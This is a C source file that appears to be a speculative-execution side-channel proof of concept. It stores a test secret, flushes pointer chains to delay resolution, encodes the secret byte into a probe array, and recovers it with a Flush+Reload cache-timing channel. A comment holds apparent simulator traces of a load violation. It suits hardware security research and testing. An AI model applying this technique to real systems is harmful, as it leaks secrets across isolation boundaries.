#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <x86intrin.h>


// inaccessible (overwritten) secret
#define SECRET      "SEC"
#define OVERWRITE   '#'
#define CACHE_MISS 80

char* data;
char* mem;
int junk = 0;

/* 

  401927: 1280943, 1294439, 1307935
  -> 401930: 1280947, 1294443, 1307939
     401937: 1280949, 1294445, 1307941

  Found possible load violation at addr: 0x4a208 between instructions [sn:1355637] and [sn:1355643]
  0x401924 and 0x401930

  
*/

// ---------------------------------------------------------------------------
void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

int flush_reload_t(void *ptr) {
  register uint64_t start = 0, end = 0;
  start = __rdtscp(&junk);
  maccess(ptr);

  end = __rdtscp(&junk);
  _mm_mfence();
  _mm_clflush(ptr);

  return (int)(end - start);
}


char access_array(int x) {
  int tmp;
  // store secret in data
  strcpy(data, SECRET);
  printf("ptr of contention location: %p\n", &data[x]);

  // flushing the data which is used in the condition increases
  // probability of speculation
  _mm_mfence();
  char** data_slowptr = &data;
  char*** data_slowslowptr = &data_slowptr;
  char**** data_ultraslowptr = &data_slowslowptr;
  //maccess(data + x);
  _mm_mfence();
  _mm_clflush(&x);
  _mm_clflush(data_slowptr);
  _mm_clflush(&data_slowptr);
  _mm_clflush(data_slowslowptr);
  _mm_clflush(&data_slowslowptr);
  _mm_clflush(data_ultraslowptr);
  _mm_clflush(&data_ultraslowptr);
  // ensure data is flushed at this point
  _mm_mfence();

  // overwrite data via different pointer
  // pointer chasing makes this extremely slow
  //printf("%c", data[x]);
  maccess(mem + data[x]*4096);
  //*((*(*(*data_ultraslowptr))) + x) = OVERWRITE;

  // data[x] should now be "#"
  // uncomment next line to break attack
  //_mm_mfence();
  // Encode stale value in the cache
  
  
}

void cache_decode_pretty(char *leaked, int index) {
  static int mix_i, i;
  for(i = 0; i < 256; i++) {
    mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
    if(flush_reload_t(mem + mix_i * 4096) < CACHE_MISS) {
      leaked[index] = mix_i;
    }
    _mm_mfence();
  }
}

int main(int argc, const char **argv) {
  data = malloc(128);
  // Detect cache threshold
  
  int pagesize = 4096;

  mem = malloc(pagesize * 256);
  // initialize memory
  memset(mem, 1, pagesize * 256);

  // store secret
  strcpy(data, SECRET);

  // Flush our shared memory
  for(int j = 0; j < 256; j++) {
    _mm_clflush(mem + j * pagesize);
  }

  // nothing leaked so far
  char * leaked = malloc(sizeof(SECRET) + 1);
  memset(leaked, ' ', sizeof(SECRET) + 1);
  leaked[sizeof(SECRET)] = 0;

  int j = 0;
  for (int i =0; i < 10; i++) {
    // for every byte in the string
    j = (j + 1) % sizeof(SECRET);
    _mm_mfence();

    // overwrite value with X, then access
    access_array(j);
    //maccess(mem + 'X'*4096);

    _mm_mfence(); // avoid speculation
    // Recover data from covert channel
    cache_decode_pretty(leaked, j);

    if(!strncmp(leaked, SECRET, sizeof(SECRET) - 1))
      break;

    //sched_yield();
  }

  printf("%s", leaked);
  free(data);
  free(mem);
  free(leaked);

  return 0;
}
